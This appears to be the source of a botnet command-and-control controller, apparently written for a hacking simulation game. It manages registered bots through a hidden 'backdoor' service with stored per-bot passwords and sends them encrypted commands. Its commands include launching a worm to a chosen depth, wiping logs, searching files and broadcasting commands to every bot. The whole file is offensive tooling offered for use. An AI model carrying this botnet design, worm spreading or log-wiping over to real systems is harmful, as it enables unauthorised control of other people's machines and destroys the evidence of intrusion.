// ======================================
// master_controller.gs
// C2 interface: manages bots, sends
// commands, collects responses
// Dependencies: kyber_lib.gs, lib_common.gs
// ======================================
import_code("/lib/kyber_lib.gs")
import_code("/lib/lib_common.gs")
import_code("/scripts/utils/find_lib.gs")
import_code("/scripts/utils/sanitize_ip.gs")
import_code("/scripts/utils/botnet_config.gs")
import_code("/scripts/utils/kyber_transport.gs")
import_code("/scripts/utils/command_validation.gs")

VERSION = "1.0"

// Use centralized configuration
BOTNET_DIR = get_config("paths.botnet_root") + "/bots"
COMMAND_QUEUE_DIR = get_config("paths.botnet_root") + "/outgoing"
INCOMING_DIR = get_config("paths.botnet_root") + "/incoming"

allowed_scripts = get_allowed_scripts()

validate_script_args = function(script, args)
    if allowed_scripts.indexOf(script) == null then return false
    allowed_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.-_/"
    for arg in args
        if arg.len > 256 then return false
        for c in arg
            if allowed_chars.indexOf(c) == null then return false
        end for
    end for
    return true
end function

try_create_lock = function(path, max_wait=30)
    comp = get_shell.host_computer
    start_time = time
    lock_acquired = false
    
    for attempt in range(0, 9)  // Up to 10 attempts
        result = comp.touch("/root/.botnet", "keygen.lock")
        if result != null then
            lock_acquired = true
            break
        end if
        
        elapsed = time - start_time
        if elapsed > max_wait then  // 30 second timeout
            log_master("Lock timeout after " + elapsed + "s", "WARN")
            return false
        end if
        
        wait(2 ^ attempt)  // Exponential: 1s, 2s, 4s, 8s, 16s
    end for
    
    return lock_acquired
end function

get_backdoor_pass = function(ip)
    pass_file = "/root/.botnet/backdoor_pass_" + ip + ".enc"
    pass = retrieve_password_kyber(pass_file)
    if pass == null then
        pass = generate_random_string(16)
        store_password_kyber(pass_file, pass)
    end if
    return pass
end function

init_master = function()
    comp = get_shell.host_computer
    comp.create_folder("/root", ".botnet")
    comp.create_folder("/root/.botnet", "bots")
    comp.create_folder("/root/.botnet", "outgoing")
    comp.create_folder("/root/.botnet", "incoming")
    if not safe_file_read(get_master_priv_file()) then
        if not try_create_lock(get_config("paths.botnet_root") + "/keygen.lock", 30) then
            log_master("Lock acquire failed", "ERROR")
            exit()
        end if
        if safe_file_read(get_master_priv_file()) then
            comp.File(get_config("paths.botnet_root") + "/keygen.lock").delete
        else
            keys = Kyber.generate_keypair()
            if keys and keys.private and keys.public then
                safe_file_write(get_master_priv_file(), keys.private)
                set_permissions(get_master_priv_file(), "600")
                safe_file_write(get_master_pub_file(), keys.public)
                set_permissions(get_master_pub_file(), "644")
                log_master("Generated master keypair", "INFO")
            end if
            comp.File(get_config("paths.botnet_root") + "/keygen.lock").delete
        end if
    end if
    if comp.File("/root/.botnet/migration_complete") == null then
        migrate_xor_passwords_to_kyber()
        comp.touch("/root/.botnet", "migration_complete")
    end if
end function

register_bot = function(ip, pubkey_enc)
    priv = safe_file_read(get_master_priv_file())
    pubkey = Kyber.decrypt_message(priv, pubkey_enc)
    safe_file_write(BOTNET_DIR + "/" + ip + ".pub", pubkey)
    set_permissions(BOTNET_DIR + "/" + ip + ".pub", "644")
    
    // NEW: Derive and store auth key for this bot (Item 32)
    bot_auth_key = generate_random_string(32)
    safe_file_write(BOTNET_DIR + "/" + ip + ".auth", bot_auth_key)
    set_permissions(BOTNET_DIR + "/" + ip + ".auth", "600")
    
    log_master("Registered bot " + sanitize_ip(ip) + " with auth key", "SUCCESS")
end function

send_command = function(ip, command)
    pubkey = safe_file_read(BOTNET_DIR + "/" + ip + ".pub")
    auth_key = safe_file_read(BOTNET_DIR + "/" + ip + ".auth")
    
    if not pubkey then
        log_master("Bot " + sanitize_ip(ip) + " not registered", "ERROR")
        return false
    end if
    
    if not auth_key then
        log_master("Bot " + sanitize_ip(ip) + " missing auth key, using legacy encryption", "WARN")
        // Fallback to unauthenticated encryption
        cipher = Kyber.encrypt_message(pubkey, command)
    else
        // NEW: Wrap with timestamp + nonce (replay protection)
        nonce = globals.generate_nonce()
        cmd_with_meta = str(time) + ":" + nonce + ":" + command
        
        // Encrypt with authentication (Item 32)
        cipher = encrypt_authenticated_command(cmd_with_meta, pubkey, auth_key)
    end if
    
    if cipher == null then return false
    
    tmp_file = "/tmp/cmd_" + str(time) + "_" + str(floor(rnd * 9999)) + ".enc"
    safe_file_write(tmp_file, cipher)
    
    connect_func = function()
        return get_shell.connect_service(ip, 22, "backdoor", get_backdoor_pass(ip))
    end function
    
    shell = retry_network(connect_func, 3, 2)
    if shell == null then
        log_master("Failed to connect to " + sanitize_ip(ip), "ERROR")
        get_shell.host_computer.File(tmp_file).delete
        return false
    end if
    
    get_shell.scp(tmp_file, "/root/.botnet/commands/", shell)
    get_shell.host_computer.File(tmp_file).delete
    shell.close
    return true
end function

collect_responses = function()
    for ip in list_bots()
        connect_func = function()
            return get_shell.connect_service(ip, 22, "backdoor", get_backdoor_pass(ip))
        end function
        shell = retry_network(connect_func, 2, 1)
        if shell == null then continue
        resp_dir = shell.host_computer.File("/root/.botnet/responses")
        if resp_dir == null then continue
        files = resp_dir.get_files
        if files == null then continue
        for f in files
            if f == null then continue
            if f.name[-4:] == ".enc" then
                cipher = f.get_content
                priv = safe_file_read("/root/.botnet/master.priv")
                if priv and cipher then
                    resp = Kyber.decrypt_message(priv, cipher)
                    if resp then
                        log_master("Resp from " + sanitize_ip(ip) + ": " + resp, "INFO")
                        safe_file_write(INCOMING_DIR + "/" + ip + "_" + f.name, resp)
                        f.delete
                    end if
                end if
            end if
        end for
    end for
end function

list_bots = function()
    comp = get_shell.host_computer
    bots = []
    bot_dir = comp.File(BOTNET_DIR)
    if bot_dir == null then return bots
    for f in bot_dir.get_files
        if f then
            name = f.name
            if name.len > 4 and name[-4:] == ".pub" then bots.push(name[:-4])
        end if
    end for
    return bots
end function

// --- Command handlers ---
command_handlers = {}

command_handlers["help"] = function()
    print("Commands:")
    print("  list             - List registered bots")
    print("  status           - Request status from all bots")
    print("  run <ip> <script> [args] - Run script on bot")
    print("  kill <ip> <script>      - Stop script on bot")
    print("  worm <ip> <depth>       - Start worm from bot")
    print("  clean <ip>       - Wipe logs on bot")
    print("  search <ip> <pattern> <flags> - Search files on bot")
    print("  logs             - Retrieve logs from all bots")
    print("  broadcast <cmd>  - Send command to all bots")
    print("  help             - This message")
    print("  exit             - Quit")
end function

command_handlers["list"] = function()
    bots = list_bots()
    print("Registered bots: " + bots.len)
    for ip in bots
        print("  " + sanitize_ip(ip))
    end for
end function

command_handlers["status"] = function()
    for ip in list_bots()
        send_command(ip, "status")
    end for
    wait(2)
    collect_responses()
end function

command_handlers["run"] = function(args)
    if args.len < 2 then
        print("Usage: run <ip> <script> [args]")
        return
    end if
    ip = args[0]
    script = args[1]
    args2 = args[2:]
    if not validate_script_args(script, args2) then
        print("ERROR: Script or arguments not allowed")
    else
        if send_command(ip, "run " + script + " " + args2.join(" ")) then
            print("Command sent to " + sanitize_ip(ip))
        else
            print("Failed to reach " + sanitize_ip(ip))
        end if
    end if
end function

command_handlers["kill"] = function(args)
    if args.len < 2 then
        print("Usage: kill <ip> <script>")
        return
    end if
    ip = args[0]
    script = args[1]
    if allowed_scripts.indexOf(script) == null then
        print("ERROR: Script not allowed")
    else
        if send_command(ip, "kill " + script) then
            print("Kill command sent to " + sanitize_ip(ip))
        else
            print("Failed to reach " + sanitize_ip(ip))
        end if
    end if
end function

command_handlers["worm"] = function(args)
    if args.len < 2 then
        print("Usage: worm <ip> <depth>")
        return
    end if
    ip = args[0]
    depth_str = args[1]
    depth_val = depth_str.to_int
    if typeof(depth_val) != "number" then
        print(red("ERROR: Depth must be numeric"))
        return
    end if
    
    if depth_val < 0 or depth_val > 10 then
        print(red("ERROR: Depth must be 0-10 (hard cap is 5)"))
        return
    end if
    
    if send_command(ip, "worm " + get_master_pub_file() + " " + depth_str) then
        print("Worm command sent to " + sanitize_ip(ip))
    else
        print("Failed to reach " + sanitize_ip(ip))
    end if
end function

command_handlers["clean"] = function(args)
    if args.len < 1 then
        print("Usage: clean <ip>")
        return
    end if
    ip = args[0]
    if send_command(ip, "clean") then
        print("Clean command sent to " + sanitize_ip(ip))
    else
        print("Failed to reach " + sanitize_ip(ip))
    end if
end function

command_handlers["search"] = function(args)
    if args.len < 3 then
        print("Usage: search <ip> <pattern> <flags>")
        return
    end if
    ip = args[0]
    pattern = args[1]
    flags = args[2]
    if send_command(ip, "run /scripts/utils/file_search.gs " + pattern + " " + flags) then
        print("Search command sent to " + sanitize_ip(ip))
        wait(2)
        collect_responses()
    else
        print("Failed to reach " + sanitize_ip(ip))
    end if
end function

command_handlers["logs"] = function()
    for ip in list_bots()
        send_command(ip, "read /root/.botnet/log.txt")
    end for
    wait(2)
    collect_responses()
end function

command_handlers["broadcast"] = function(args)
    if args.len < 1 then
        print("Usage: broadcast <cmd>")
        return
    end if
    cmd = args.join(" ")
    if not validate_script_args("/bin/slave.gs", [cmd]) then
        print("Invalid broadcast command")
    else
        for ip in list_bots()
            send_command(ip, cmd)
        end for
        print("Broadcast sent to all bots")
    end if
end function

// --- Main loop ---
command_loop = function()
    print(blue("Master Controller v" + VERSION))
    command_handlers["help"]()
    while true
        n = list_bots().len
        input = sanitize_input(user_input(white("master [" + n + " bots]> ")))
        parts = input.split(" ")
        if parts.len == 0 then continue
        cmd = parts[0]
        args = parts[1:]
        if cmd == "exit" then break
        if command_handlers.hasIndex(cmd) then
            command_handlers[cmd](args)
        else
            print(red("Unknown command: " + cmd + " (type 'help')"))
        end if
    end while
end function

init_master()
command_loop()
